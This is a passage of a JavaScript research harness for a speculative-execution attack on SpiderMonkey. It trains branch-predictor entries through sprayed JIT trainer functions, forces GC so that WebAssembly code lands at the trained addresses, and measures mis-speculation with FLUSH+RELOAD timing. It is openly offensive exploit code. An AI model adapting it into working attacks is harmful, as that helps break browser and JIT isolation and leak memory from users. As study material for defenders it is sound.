/*
 * Branch Target Reuse (BTR)
 * April 30th 2026
 * Yuhui Zhu
 */

// Cache and memory layout
const PAGE_SZ = 4096;
const CACHE_LINE_SZ = 64;
const CACHE_LINES_PER_PAGE = PAGE_SZ/CACHE_LINE_SZ;
const CACHE_WAYS = 4;

// JIT warm-up
const JIT_WARMUP_BL = 200;
const JIT_WARMUP_OPT = 20000;

// Dispatcher and callee scripts
const DISPATCH_ARGS = ["bh_fp", "bh_base", "func"];
const CALLEE_ARGC = 3;
const CALLEE_ARGS_PREFIX = "args";

// FLUSH+RELOAD
const FR_CACHE_LINE = 33;
const FR_THRESHOLD = 70;

// Trainer grid stride (BTB landing stride) per len_trainer, in bytes. A sprayed
// trainer with memory index i lands at offset i*grid, so this maps a trainer's
// len_trainer to the stride used by --pool-layout's byte-offset selection.
// Keep in sync with trainer_len.txt / common.sh (empirically measured).
const TRAINER_GRID_BY_LEN = { 12: 0x200, 76: 0x400, 120: 0x600 };

// Smallest valid wasm binary: the 8-byte module preamble with no sections --
// the 4-byte magic "\0asm" (0x00 0x61 0x73 0x6d) followed by version 1
// (0x01 0x00 0x00 0x00). Compiles to an empty module.
const EMPTY_WASM_BIN = new Uint8Array([0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00]);

// ===========================================================================
// Config: pure attack parameters. No buffers, no generated functions -- just
// the knobs. parse_args() builds one from the command line; Config.minimal()
// builds the tiny one force_jit_utils() uses to pre-JIT the go()-loop functions
// cheaply. Everything downstream is passed a Config explicitly (no globals).
// ===========================================================================
class Config {
  constructor() {
    this.nr_bh = 256;
    this.nr_bcond = 512;
    this.nr_bcond_taken = 16;
    this.nr_trainer = 256;
    this.nr_target = 1;
    this.len_trainer = 120;
    this.repeats = 10;
    this.nr_callee_argc = CALLEE_ARGC;
    // Reload time (ns) below which a probe counts as a cache hit. FR_THRESHOLD
    // is the default; ./fr_calib.sh measures this host's hit/miss distributions
    // and prints the --fr-threshold value they support.
    this.fr_threshold = FR_THRESHOLD;
    // Fingerprint-buffer layout (two-level strided; see Context).
    this.fp_group_bytes = CACHE_LINE_SZ;
    this.fp_group_stride = PAGE_SZ;
    this.buf_global_offset = 0;
    // Flags
    this.flag_fixed_training = false;
    this.flag_no_skip_gc = false;
    this.flag_no_skip_wa = false;
    // Pool-aware ("layout") spray training. pool_layout is the raw
    // "first_pool_offset,pool_len,pool_interval,nr_pools" string (bytes; see
    // get_usable_trainer_indices). trainer_grid overrides the len_trainer-derived
    // grid stride (0 = derive from TRAINER_GRID_BY_LEN).
    this.pool_layout = null;
    this.trainer_grid = 0;
    // Resources
    this.wa_bin_path = null;
    // GC-forcing storm (see trigger_gc): allocate gc_storm_rep buffers of
    // gc_storm_bytes each within one JS job to overshoot SpiderMonkey's
    // non-incremental malloc-heap limit and force a stop-the-world GC.
    // gc_storm_bytes: per-buffer size. Large => the limit is crossed in few
    //   iterations (fewer branches imprinted on the BTB), and the bytes are
    //   near-free physically (lazily zero-mapped, never touched).
    //   force_jit_utils() drops this to 0 to warm trigger_gc's real body (same
    //   bytecode) without allocating.
    // gc_storm_rep: buffer count. Keep >=2: gc_junk holds one buffer live, so a
    //   single alloc only accounts 1x its size and can miss on a hot zone.
    this.gc_storm_bytes = 512 * 1024 * 1024;
    this.gc_storm_rep = 2;
    // Whether Context should run the expensive dispatcher/dummy-callee Ion
    // warm-up. True for the real attack; false for the minimal warmup config.
    this.dispatcher_warmup = true;
    this.trainer_warmup = JIT_WARMUP_BL;
  }

  static parseArgs(scriptArgs) {
    let cfg = new Config();
    for (let i = 0; i < scriptArgs.length; i++) {
      const arg = scriptArgs[i];
      if (arg === "--nr-bh" && i + 1 < scriptArgs.length) {
        cfg.nr_bh = parseInt(scriptArgs[++i]);
      } else if (arg === "--nr-bcond" && i + 1 < scriptArgs.length) {
        cfg.nr_bcond = parseInt(scriptArgs[++i]);
      } else if (arg === "--nr-bcond-taken" && i + 1 < scriptArgs.length) {
        cfg.nr_bcond_taken = parseInt(scriptArgs[++i]);
      } else if (arg === "--nr-trainer" && i + 1 < scriptArgs.length) {
        cfg.nr_trainer = parseInt(scriptArgs[++i]);
      } else if (arg === "--len-trainer" && i + 1 < scriptArgs.length) {
        cfg.len_trainer = parseInt(scriptArgs[++i]);
      } else if (arg === "--nr-target" && i + 1 < scriptArgs.length) {
        cfg.nr_target = parseInt(scriptArgs[++i]);
      } else if (arg === "--fixed-training") {
        cfg.flag_fixed_training = true;
      } else if (arg === "--pool-layout" && i + 1 < scriptArgs.length) {
        cfg.pool_layout = scriptArgs[++i];
      } else if (arg === "--trainer-grid" && i + 1 < scriptArgs.length) {
        cfg.trainer_grid = parseInt(scriptArgs[++i]);
      } else if (arg === "--no-skip-gc") {
        cfg.flag_no_skip_gc = true;
      } else if (arg === "--no-skip-wa") {
        cfg.flag_no_skip_wa = true;
      } else if (arg === "--repeats" && i + 1 < scriptArgs.length) {
        cfg.repeats = parseInt(scriptArgs[++i]);
      } else if (arg === "--wa-mod" && i + 1 < scriptArgs.length) {
        cfg.wa_bin_path = scriptArgs[++i];
        print(cfg.wa_bin_path);
      } else if (arg === "--fr-threshold" && i + 1 < scriptArgs.length) {
        cfg.fr_threshold = parseInt(scriptArgs[++i]);
      } else if (arg === "--gc-storm-mb" && i + 1 < scriptArgs.length) {
        cfg.gc_storm_bytes = parseInt(scriptArgs[++i]) * 1024 * 1024;
      } else if (arg === "--gc-storm-rep" && i + 1 < scriptArgs.length) {
        cfg.gc_storm_rep = parseInt(scriptArgs[++i]);
      }
    }
    return cfg;
  }

  // Smallest viable Config so force_jit_utils() can JIT-compile the go()-loop
  // functions cheaply: one BH slot, tiny fingerprint, no dispatcher warm-up.
  // Same class as the real Config, so functions compiled against it match the
  // real object shape (avoids Warp shape bailouts).
  static minimal() {
    let cfg = new Config();
    cfg.nr_bh = 1;
    cfg.nr_bcond = 8;
    cfg.nr_bcond_taken = 1;
    cfg.nr_trainer = 1;
    cfg.nr_target = 1;
    cfg.len_trainer = 8;
    cfg.repeats = 0;
    cfg.dispatcher_warmup = false;
    // Throwaway warmup trainers don't need to be JIT-compiled (make_trainer &co
    // reach Ion by call count, not by trainer heat), so heat them just once.
    cfg.trainer_warmup = 1;
    return cfg;
  }

  print() {
    print("--- Constants ---");
    print(`PAGE_SZ: ${PAGE_SZ}`);
    print(`CACHE_WAYS: ${CACHE_WAYS}`);
    print("--- Parameters ---");
    print(`nr_bh: ${this.nr_bh}`);
    print(`nr_bcond: ${this.nr_bcond}`);
    print(`nr_bcond_taken: ${this.nr_bcond_taken}`);
    print(`nr_trainer: ${this.nr_trainer}`);
    print(`len_trainer: ${this.len_trainer}`);
    print(`nr_target: ${this.nr_target}`);
    print(`repeats: ${this.repeats}`);
    print(`fr_threshold: ${this.fr_threshold}`);
    print(`flag_fixed_training: ${this.flag_fixed_training}`);
    print(`flag_no_skip_gc: ${this.flag_no_skip_gc}`);
    print(`flag_no_skip_wa: ${this.flag_no_skip_wa}`);
    print(`pool_layout: ${this.pool_layout}`);
    print(`trainer_grid: ${this.trainer_grid}`);
    print(`wa_bin_path: ${this.wa_bin_path}`);
    print(`gc_storm_bytes: ${this.gc_storm_bytes}`);
    print(`gc_storm_rep: ${this.gc_storm_rep}`);
    print("------------------");
  }
}

// ===========================================================================
// Context: the runtime state built from a Config. It owns every buffer (F+R
// buffer, fingerprint buffer, target wasm binary) and every dynamically
// generated function (the dispatcher), plus the scratch/runtime state the
// attack mutates (spawned-trainer id counter, script cache, fixed-training
// list, GC-storm junk). Attack-flow functions receive (cfg, ctx) explicitly.
//
// The dispatcher reads a per-invocation branch-history fingerprint from bh_fp
// and executes a sequence of conditional branches whose taken/not-taken pattern
// drives the BHB into a slot-specific state before the indirect call to func,
// implementing BHI-based iBTB entry diversification.
//
// Fingerprint buffer layout
// -------------------------
// Bits are packed into groups of fp_group_bytes (= one cache line); consecutive
// groups within a slot are separated by fp_group_stride (= one page) rather than
// placed adjacently, so that (a) each group maps to a distinct cache set,
// keeping fingerprint reads disjoint from the FLUSH+RELOAD probe line; (b) reads
// from different slots never alias in the cache; and (c) the page stride
// suppresses hardware stream prefetching.
// ===========================================================================
class Context {
  constructor(cfg) {
    this.cfg = cfg;

    // Runtime/scratch state.
    this.jit_prog_id = 0;
    this.script_by_len = new Map();
    this.fixed_training_chunks = null;
    // Trainer indices train_btb cycles across the nr_bh slots. Filled once at
    // init by get_usable_trainer_indices: the identity range [0..nr_trainer) with
    // no --pool-layout, or the pool-landing subset with one.
    this.train_indices = null;
    this.gc_junk = null;

    // Buffers.
    // F+R buffer. fru8array (the typed-array VIEW) is what the callees read; it
    // is passed as callee_argv[0] so the bare-invoked dummy_callee_reload* can
    // index it without any global. frbuf (the ArrayBuffer) is what the native
    // flushbufoffset/reloadbufoffset take.
    this.frbuf = new ArrayBuffer(0x100000);
    this.fru8array = new Uint8Array(this.frbuf);
    // Target wasm binary.
    this.wa_bin = cfg.wa_bin_path ? os.file.readFile(cfg.wa_bin_path, "binary")
                                  : null;

    // Signatures.
    this.init_arg_names();

    // Fingerprint buffer (sets bh_fp_u8array, offsets, bh_bytes/groups, buf).
    this.init_bh_fp();

    // Dummy-callee argument vector, then warm the (inherited-style) callees.
    this.init_dummy_callee_argv();
    if (cfg.dispatcher_warmup) this.warm_dummy_callees();

    // Dispatcher.
    this.init_dispatcher_argv();
    this.init_dispatcher();
  }

  // --- Dummy callees ---
  // Invoked as BARE function references by the dispatcher (no `this`), so they
  // must read the F+R view from their argument, not from `this` or a global:
  // arg0 is fru8array (see callee_argv[0]).
  //
  // HACK: Spawning dummy callees as methods reduces the controlled BTB entries.
  dummy_callee_reload1(arg0, arg1, arg2) {
    let a = arg1;
    return a ^ arg0[arg2];
  }

  dummy_callee_reload2(arg0, arg1, arg2) {
    let a = arg2;
    return a ^ arg0[arg2];
  }

  dummy_callee(arg0, arg1, arg2) {
    let a=0x1234;
    let c=a;
    return a;
  }

  warm_dummy_callees() {
    for (let i = 0; i < JIT_WARMUP_OPT; i++) {
      this.dummy_callee(...this.dummy_callee_argv);
      this.dummy_callee_reload1(...this.dummy_callee_argv);
      this.dummy_callee_reload2(...this.dummy_callee_argv);
    }
  }

  // --- Function signatures ---

  init_arg_names() {
    let callee_args = [];
    for (let i = 0; i < this.cfg.nr_callee_argc; i++) {
      callee_args.push(`${CALLEE_ARGS_PREFIX}${i}`);
    }
    this.callee_args = callee_args;
    this.dispatcher_args = DISPATCH_ARGS.concat(callee_args);
  }

  init_dummy_callee_argv() {
    // callee_argv[0] = the F+R VIEW (indexed by the reload callees).
    let callee_argv = [this.fru8array];
    for (let i = 0; i < this.cfg.nr_callee_argc - 1; i++) {
      callee_argv.push(Math.floor(Math.random() * 0xfff));
    }
    this.dummy_callee_argv = callee_argv;
  }

  init_dispatcher_argv() {
    this.dummy_dispatcher_argv =
      [this.bh_fp_u8array, this.offsets[0], this.dummy_callee]
        .concat(this.dummy_callee_argv);
  }

  // --- Branch-history fingerprint buffer ---

  get_bh_base_by_index(i) {
    return this.buf_global_offset + i * this.cfg.fp_group_stride * this.bh_groups;
  }

  // Allocate the fingerprint buffer and align buf_global_offset so that the
  // first group of slot 0 starts at a cache-line boundary whose cache-set index
  // is under attacker control.
  create_bh_fp() {
    let cfg = this.cfg;
    this.bh_bytes = Math.ceil(cfg.nr_bcond / 8);
    this.bh_groups = Math.ceil(this.bh_bytes / cfg.fp_group_bytes);
    this.buf_size = cfg.fp_group_stride * this.bh_groups * cfg.nr_bh;
    this.buf_size = Math.max(0x600000, this.buf_size);
    this.buf = new ArrayBuffer(this.buf_size);
    this.bh_fp_u8array = new Uint8Array(this.buf);
    for (let i = 0; i < this.bh_fp_u8array.length; i++) this.bh_fp_u8array[i] = 0;
    this.buf_global_offset =
      cfg.buf_global_offset &
      ~(cfg.fp_group_bytes - 1) &
      (cfg.fp_group_stride - 1);
  }

  get_shuffled_array(min, max) {
    let array = new Array(max)
    for (let i = min; i < max; i++) {
        array[i] = i;
    }
    for (let i = min; i < max; i++) {
        let temp = array[i];
        let randomIndex = min + Math.floor(Math.random() * (max - min));
        array[i]           = array[randomIndex];
        array[randomIndex] = temp;
    }
    return array
  }

  // Map condition-bit index idx to its strided location within a fingerprint
  // slot. Returns {offset, bit}.
  bcond_to_fp_offset(idx) {
    let byte = Math.floor(idx / 8);
    let group = Math.floor(byte / this.cfg.fp_group_bytes);
    let byte_in_group = byte % this.cfg.fp_group_bytes;
    let offset = (group * this.cfg.fp_group_stride) + byte_in_group;
    let bit = idx % 8;
    return {offset, bit};
  }

  // Populate the fingerprint buffer with per-slot random bit patterns: for each
  // slot, nr_bcond_taken bit positions (out of nr_bcond) are set, each group on
  // a separate page (distinct cache set).
  rand_bh_fp() {
    this.offsets = [];
    for (let i = 0; i < this.cfg.nr_bh; i++) {
      let rand_array = this.get_shuffled_array(0, this.cfg.nr_bcond);
      let bh_base = this.get_bh_base_by_index(i);
      for (let j = 0; j < this.cfg.nr_bcond_taken; j++) {
        let {offset, bit} = this.bcond_to_fp_offset(rand_array[j]);
        let ptr = bh_base + offset;
        let v = this.bh_fp_u8array[ptr];
        v |= 1 << bit;
        this.bh_fp_u8array[ptr] = v;
      }
      this.offsets.push(bh_base);
    }
  }

  init_bh_fp() {
    this.create_bh_fp();
    this.rand_bh_fp();
  }

  // --- Dispatcher function ---

  // Emit the dispatcher function body as a JavaScript string. For each BH bit
  // index i, read the byte at the strided offset from bh_fp and test the bit;
  // each access targets a distinct cache set. The conditional branch drives the
  // BHB into the slot-specific state before the indirect call to func.
  build_dispatcher() {
    let argc = this.cfg.nr_callee_argc;
    let header = `let junk = 0;\n` +
                 `let tmp = 0;\n`;

    // HACK: The for-loop below is mandatory to maximize injection of BTB entries
    let bh_body = "for (let j=0; j<1; j++) {\n";
    for (let i = 0; i < this.cfg.nr_bcond; i++) {
      let {offset, bit} = this.bcond_to_fp_offset(i);
      let mask = 1<<bit;
      bh_body += `tmp = ${DISPATCH_ARGS[0]}[bh_base+${offset}] & ${mask};\n`
      bh_body += `if (tmp==0) { junk ^= tmp; junk += (${i} + j); junk = junk % 32;}\n`;
    }
    bh_body += "}\n";

    let callee_args = "";
    for (let i = 0; i < argc; i++) {
      callee_args += `${CALLEE_ARGS_PREFIX}${i}`;
      if (i < argc - 1) callee_args += ",";
    }
    let tail = `junk += ${DISPATCH_ARGS[2]}(${callee_args});\nreturn junk;`;

    this.dispatcher_str = header + bh_body + tail;
  }

  instantiate_dispatcher() {
    let f = new Function(
      ...this.dispatcher_args,
      this.dispatcher_str
    );

    if (this.cfg.dispatcher_warmup) {
      let funcs = [
        new Function("a", "b", "c", "return 0;"),
        new Function("a", "b", "c", "return 1;"),
        new Function("a", "b", "c", "return 2;"),
        new Function("a", "b", "c", "return 3;"),
      ];
      // Create a BH_FP buffer filled with 0 so that forcing JIT of the
      // dispatcher reaches the statements inside the if-0 branches (warms them
      // up and avoids extra IC stubs).
      let dummy_buf_size = this.cfg.fp_group_stride * this.bh_groups;
      let dummy_bh_0 = new Uint8Array(new ArrayBuffer(dummy_buf_size));
      let callee_argv_dummy = this.dummy_callee_argv;
      for (let i = 0; i < JIT_WARMUP_OPT * 3; i++)
        f(dummy_bh_0, 0, funcs[i % 4], ...callee_argv_dummy);
    }
    this.dispatcher = f;
  }

  init_dispatcher() {
    this.build_dispatcher();
    this.instantiate_dispatcher();
  }
}

// ===========================================================================
// Attack-flow functions. All take (cfg, ctx) explicitly and reference no
// module globals -- every parameter comes from cfg, every buffer/function from
// ctx.
// ===========================================================================

function trigger_gc(cfg, ctx) {
  if (cfg.flag_fixed_training && !cfg.flag_no_skip_gc) return;
  // Core idea: force a synchronous, whole-heap stop-the-world GC without the
  // shell-only gc() builtin. SpiderMonkey's major GC is normally incremental
  // (time-sliced) + async background sweep, but it falls back to a
  // non-incremental collection when a zone's malloc-heap accounting crosses its
  // hard "incremental limit" faster than the collector can keep up. Each
  // ArrayBuffer bumps that accounting by its requested size at allocation time
  // (independent of resident pages -- large buffers are lazily zero-mapped, so
  // this is near-free physically on Linux), so allocating a couple of large
  // buffers back-to-back within one JS job (no await/yield, or an incremental
  // slice would push the counter back down) overshoots the limit and trips the
  // stop-the-world path. That in turn tenures/compacts the JITed callees the
  // reuse attack depends on. gc_junk keeps one buffer live, so keep >=2 iters:
  // a single buffer only accounts 1x its size and can miss on a hot zone.
  for (let i = 0; i < cfg.gc_storm_rep; i++) {
    ctx.gc_junk = new ArrayBuffer(cfg.gc_storm_bytes);
  }
}

// Resolve the trainer grid stride (bytes). Explicit --trainer-grid wins; else
// derive from len_trainer via TRAINER_GRID_BY_LEN. Fatal if unresolved.
function trainer_grid(cfg) {
  if (cfg.trainer_grid > 0) return cfg.trainer_grid;
  let g = TRAINER_GRID_BY_LEN[cfg.len_trainer];
  if (!g) {
    print(`Error: no trainer grid stride for len_trainer=${cfg.len_trainer}; ` +
          `pass --trainer-grid <bytes> or add a measured row to TRAINER_GRID_BY_LEN.`);
    quit(1);
  }
  return g;
}

// Sign-aware integer parse for layout fields (negative hex/decimal like "-0x10"):
// split off a leading '-' and re-apply it to parseInt of the magnitude (parseInt
// honors a 0x prefix).
function parse_signed_int(s) {
  s = s.trim();
  return s[0] === "-" ? -parseInt(s.slice(1)) : parseInt(s);
}

// Parse cfg.pool_layout "F,L,I,N" -> {F, L, I, N}. F (first pool offset relative
// to trainer 0) may be negative; L/I/N are positive counts. Fatal on malformed input.
function parse_pool_layout(cfg) {
  let parts = cfg.pool_layout.split(",").map(parse_signed_int);
  if (parts.length !== 4 || parts.some(v => !Number.isFinite(v))) {
    print(`Error: --pool-layout expects "first_pool_offset,pool_len,pool_interval,nr_pools" ` +
          `(4 integers), got "${cfg.pool_layout}".`);
    quit(1);
  }
  let [F, L, I, N] = parts;
  if (N < 1 || L <= 0 || (N > 1 && I <= 0)) {
    print(`Error: --pool-layout requires nr_pools>=1, pool_len>0, pool_interval>0 ` +
          `(when nr_pools>1); got F=${F} L=${L} I=${I} N=${N}.`);
    quit(1);
  }
  return { F, L, I, N };
}

// Compute the trainer indices train_btb should cycle, ONCE at init, and store them
// on ctx.train_indices. Without --pool-layout: the identity range [0..nr_trainer)
// (covers all sprayed trainers -> current spray behavior). With --pool-layout: the
// pool-landing subset -- trainer i (at offset i*grid relative to trainer 0) is usable
// iff i*grid falls inside some pool [F+k*I, F+k*I+L) (trampoline mode; the runtime
// port of tools/coverage.py's reaches_gadget). In layout mode cfg.nr_trainer is set to
// the spray count -- the smaller of the user's nr_trainer and the geometry's reach --
// and the loop selects the usable indices below it. Raising nr_trainer to the geometry's
// reach extends coverage to the higher-index pools.
function get_usable_trainer_indices(cfg, ctx) {
  if (!cfg.pool_layout) {
    let idxs = [];
    for (let i = 0; i < cfg.nr_trainer; i++) idxs.push(i);
    ctx.train_indices = idxs;
    return idxs;
  }
  let { F, L, I, N } = parse_pool_layout(cfg);
  let grid = trainer_grid(cfg);
  let max_off = F + (N - 1) * I + L;              // exclusive high edge of last pool
  let max_index = Math.floor((max_off - 1) / grid);
  if (max_index < 0) {
    print(`Error: --pool-layout has no non-negative landing (F=${F} too negative ` +
          `for grid=0x${grid.toString(16)}).`);
    quit(1);
  }
  // Spray count is the smaller of the geometry's reach (max_index+1) and the user's
  // nr_trainer. The selection loop runs to it, so every selected index is one that
  // spray_training_chunks actually sprays.
  let nr_trainer = Math.min(cfg.nr_trainer, max_index + 1);
  cfg.nr_trainer = nr_trainer;
  let idxs = [];
  for (let i = 0; i < nr_trainer; i++) {
    let off = i * grid;
    for (let k = 0; k < N; k++) {
      let base = F + k * I;
      if (base <= off && off < base + L) { idxs.push(i); break; }
    }
  }
  if (idxs.length === 0) {
    print(`Error: --pool-layout selects 0 usable trainers within nr_trainer=${nr_trainer} ` +
          `(F=${F} L=${L} I=${I} N=${N} grid=0x${grid.toString(16)}); ` +
          `raise --nr-trainer or adjust the layout.`);
    quit(1);
  }
  ctx.train_indices = idxs;
  print(`pool-layout: ${idxs.length} usable of ${nr_trainer} sprayed ` +
        `(grid=0x${grid.toString(16)}, ${N} pools).`);
  return idxs;
}

function get_fixed_training_list(cfg, ctx) {
  if (ctx.fixed_training_chunks == null) {
    ctx.fixed_training_chunks = [];
    for (let i = 0; i < cfg.nr_trainer; i++) {
      let callee = (i%2==0) ? ctx.dummy_callee_reload1 : ctx.dummy_callee_reload2;
      ctx.fixed_training_chunks.push(callee);
    }
  }
  return ctx.fixed_training_chunks;
}

function get_spawn_id(ctx) {
  return ctx.jit_prog_id++;
}

function spawn_trainer(cfg, ctx) {
  let nr_len = cfg.len_trainer;
  let script = ctx.script_by_len.get(nr_len);
  if (script == undefined){
    script = `let a=0x1234; let c=a; `;
    for (let nr_junk_op = 0; nr_junk_op < nr_len; nr_junk_op++) {
      script += nr_junk_op % 2 == 0 ? `a=c;` : `c=a;`;
    }
    script += "return a;";
    ctx.script_by_len.set(nr_len, script);
  }
  let script_new = `/*${get_spawn_id(ctx)}*/ ` + script;
  return script_new;
}

function make_trainer(cfg, ctx, srefs, wrefs) {
  let func = new Function(...ctx.callee_args, spawn_trainer(cfg, ctx));
  // store references of the Function object
  if (srefs) srefs.push(func);
  if (wrefs) wrefs.push(new WeakRef(func));
  // force JIT compile
  for (let i = 0; i < cfg.trainer_warmup; i++) {
    func(...ctx.dummy_callee_argv);
  }
}

function spray_training_chunks(cfg, ctx) {
  let srefs = [];
  for (let i = 0; i < cfg.nr_trainer; i++) {
    make_trainer(cfg, ctx, srefs, null);
  }
  return srefs;
}

// --- iBTB training ---

// Train the iBTB by routing trainers[0] through all nr_bh dispatcher slots,
// each under a distinct BHB state, so that every iBTB entry becomes associated
// with the same training chunk address. On the test phase, when the target
// chunk is mapped at that address, every slot mis-speculates to it regardless
// of the active BHB fingerprint.
function train_btb(cfg, ctx, trainers) {
  let dummy_argv = ctx.dummy_callee_argv;
  let u8array = ctx.bh_fp_u8array;
  let nr_trainers = trainers.length;
  // WARNING: for regular (sprayed) training, keep nr_bh <= nr_trainer!
  // Otherwise trainers[j % nr_trainers] reuses each trainer many times, pushing
  // it past the JIT tier-up threshold -> it recompiles (baseline -> Ion) and
  // RELOCATES, moving the address the iBTB was trained on and disrupting the
  // executable-memory layout the reuse attack depends on. (--fixed-training is
  // immune: its callees are pre-JITed and stay put.)
  for (let i = 0; i < 4; i++) {
    for (let j = 0; j < cfg.nr_bh; j++) {
      let bh_base = ctx.offsets[j];
      let callee = trainers[j % nr_trainers];
      for (let k = 0; k < 2; k++) {
        ctx.dispatcher(u8array, bh_base, callee, ...dummy_argv);
      }
    }
  }
}

function prep_btb(cfg, ctx) {
  let trainers = null;
  if (cfg.flag_fixed_training) {
    trainers = get_fixed_training_list(cfg, ctx);
  }
  else {
    let srefs = spray_training_chunks(cfg, ctx);
    // Force GC here to assure JITed dummy callees survive across GC cycles.
    // srefs stays referenced, so every sprayed trainer remains resident here.
    trigger_gc(cfg, ctx);
    // Select the training subset from the index list computed once at init:
    // the identity range (all trainers) without --pool-layout, or the
    // pool-landing subset with one. train_btb cycles these across the nr_bh slots.
    let idxs = ctx.train_indices;
    trainers = [];
    for (let k = 0; k < idxs.length; k++) trainers.push(srefs[idxs[k]]);
  }
  train_btb(cfg, ctx, trainers);
  // srefs can be recycled when this function finishes
}

// --- iBTB testing (FLUSH+RELOAD) ---

// Trigger mis-speculation at each dispatcher slot and measure the F+R signal.
// Slot i uses its own probe line: fr_flush[i] is the offset flushed and
// reloaded, fr_spec[i] the index the speculative load gets. For each slot
// (reverse order): flush the probe line from frbuf; dispatch to dummy_callee so
// the iBTB mis-predicts to a training callee, which speculatively accesses the
// view at fr_spec[i]; then time the reload. Returns one reload time per slot.
function test_btb(cfg, ctx, callee_argv, fr_flush, fr_spec) {
  let u8array = ctx.bh_fp_u8array;
  let dummy_callee = ctx.dummy_callee;
  let frbuf = ctx.frbuf;
  let results = [];
  for (let i = cfg.nr_bh - 1; i >= 0; i--) {
    callee_argv[1] = fr_flush[i];
    callee_argv[2] = fr_spec[i];
    let bh_base = ctx.offsets[i];
    flushbufoffset(frbuf, callee_argv[1]);
    flushjitptr(dummy_callee);
    ctx.dispatcher(u8array, bh_base, dummy_callee, ...callee_argv);
    let time = reloadbufoffset(frbuf, callee_argv[1]);
    results.push(time);
  }
  return results;
}

function load_target_chunk(cfg, ctx, wa_bin) {
  if (cfg.flag_fixed_training && !cfg.flag_no_skip_wa) return;
  let srefs = [];
  for (let i=0; i<cfg.nr_target; i++) {
    let mod = new WebAssembly.Module(wa_bin.buffer);
    let instance = new WebAssembly.Instance(mod);
    srefs.push(instance);
    // print(wasmDis(instance));
  }
  srefs = [];
}

function go(cfg, ctx) {
  let fr_offset = (FR_CACHE_LINE * CACHE_LINE_SZ) + 0x3025;
  // leak_argv[0] = the F+R VIEW (read by the reload callees); [1]/[2] offsets.
  let leak_argv = [ctx.fru8array, fr_offset, fr_offset];
  // Per-slot probe lines, refilled at the top of every iteration. fr_flush holds
  // the offsets test_btb flushes and reloads, fr_spec the indices the
  // speculative loads get. Sized once so the loop below only writes elements.
  let fr_flush = new Array(cfg.nr_bh).fill(0);
  let fr_spec = new Array(cfg.nr_bh).fill(0);
  let nr_pages = Math.floor(ctx.fru8array.length / PAGE_SZ);
  let fr_byte = fr_offset % CACHE_LINE_SZ;
  let result = [];
  for (let i=0; i<cfg.repeats; i++) {
    // Odd iterations are true F+R probes; even are control runs where the
    // speculative load is directed to a harmless out-of-range index so the
    // probe line is never brought into cache, giving a noise baseline.
    let do_fr_probe = (i%2==1);

    // Draw this iteration's probe lines up front, so nothing below the target
    // load competes with the dispatch. Every BTB entry gets its own line: a
    // random cache line of a random page, keeping the intra-line byte offset.
    // Page 0 is left to the training callees (which index it) and the residency
    // warm-up write, and the first and last line of each page stay out, keeping
    // the probe line clear of the adjacent-line prefetcher. On a control
    // iteration the speculative load goes out of range instead, so the flushed
    // line stays uncached.
    for (let j = 0; j < cfg.nr_bh; j++) {
      let fr_page = 1 + Math.floor(Math.random() * (nr_pages - 1));
      let fr_line = 1 + Math.floor(Math.random() * (CACHE_LINES_PER_PAGE - 2));
      fr_flush[j] = (fr_page * PAGE_SZ) + (fr_line * CACHE_LINE_SZ) + fr_byte;
      fr_spec[j] = (do_fr_probe) ? fr_flush[j] : 0xffffff;
    }

    // 0. Compile an empty module first (its 1-page shared-stub alloc sits below
    //    the training region). After step 2's GC frees it, the cursor rewinds to
    //    this low slot, so step 3's target lands its own shared stub here and its
    //    8-page code block on the freed training pages -- keeping the stub off the
    //    gadget region.
    load_target_chunk(cfg, ctx, EMPTY_WASM_BIN);
    
    // 1. Train BTB: use offset=0 so any speculative access during training
    //    lands at index 0, not at the probe line.
    leak_argv[1] = 0;
    leak_argv[2] = 0;
    prep_btb(cfg, ctx);

    // 2. Trigger GC to reclaim training chunks and release their VA pages.
    trigger_gc(cfg, ctx);

    // 3. Load target chunks so the JIT maps them at the freed addresses.
    load_target_chunk(cfg, ctx, ctx.wa_bin);

    // 4. Dispatch to dummy callees to trigger mis-speculation.
    let res = test_btb(cfg, ctx, leak_argv, fr_flush, fr_spec);

    // 5. Measure the F+R signal.
    // TODO: refactor this part when the probing is working and stable!!!
    let cnt = 0;
    let sum = 0;
    for (let j=0; j<res.length; j++) {
      if (res[j]<cfg.fr_threshold) cnt++;
      sum += res[j];
    }
    print(`rep=${i}: cnt=${cnt}, avg=${sum/res.length-1}`);
    if (do_fr_probe && cnt > 0) {
      result.push(cnt);
    }

    // 6. Trigger GC to reclaim target chunks before the next iteration.
    trigger_gc(cfg, ctx);
  }
  // The aggregate is printed by the caller, so only the real measurement run
  // reports it (the warmup go() calls in force_jit_utils() discard this).
  return result;
}

// ===========================================================================
// JIT pre-warming
// ===========================================================================

function force_jit_utils(cfg, ctx) {
  // WHY: pre-JIT every util function in go()'s call chain up front, so their JIT
  // code is allocated during init instead of being compiled DURING the
  // measurement loop (which would fragment executable memory mid-attack).
  //
  // CALL CHAIN (the warmup roadmap; the numbered steps below follow it):
  //   prep_btb → {get_fixed_training_list | spray_training_chunks → make_trainer
  //               → spawn_trainer → get_spawn_id} → train_btb
  //   trigger_gc
  //   load_target_chunk → WebAssembly.Module/Instance
  //   test_btb
  //
  // WHICH CONTEXT each function is warmed on -- this decouples cfg (loop counts)
  // from ctx (buffers + dispatcher):
  //  - Functions that CALL ctx.dispatcher (prep_btb->train_btb, test_btb, and go
  //    whose loop calls them) warm on the REAL ctx with a MINIMAL cfg. The real
  //    dispatcher settles their call ICs (a minimal ctx's dispatcher is a
  //    different Function -> the real one would deopt every rep), while cfgMin
  //    (nr_bh=1, nr_trainer=1) keeps the loop counts cheap and independent of the
  //    real nr_bh/nr_trainer.
  //  - Functions that DON'T touch the dispatcher (spray chain, load_target_chunk,
  //    trigger_gc, get_spawn_id) warm on the throwaway ctxMin, leaving the real
  //    ctx clean of their spray/wasm/counter side effects.
  //
  // GOTCHAS (verified with tools/jit_ev.gdb + tools/jit_churn.awk):
  //  - Baseline warmup is not enough: a function tiers up to Ion/Warp the first
  //    time it gets hot in the loop, so every path is warmed PAST the Ion
  //    threshold here.
  //  - Warp specializes on object SHAPE, so ctxMin is a real Context built from
  //    Config.minimal() -- the SAME class as the attack's ctx -- and thus
  //    prep_btb/test_btb compile against the identical shape.
  //  - Assumes repeats < 200: the once-per-rep paths (load_target_chunk etc.) are
  //    warmed enough that their in-loop Ion crossing, if any, lands well past 200.
  const WARM = 2500;
  let cfgMin = Config.minimal();
  let ctxMin = new Context(cfgMin);

  // 1. Warm the leaf functions train_btb (calls the real dispatcher) and
  //    get_fixed_training_list directly on the REAL ctx, so step 2's prep_btb
  //    warmup already sees them Ion-compiled.
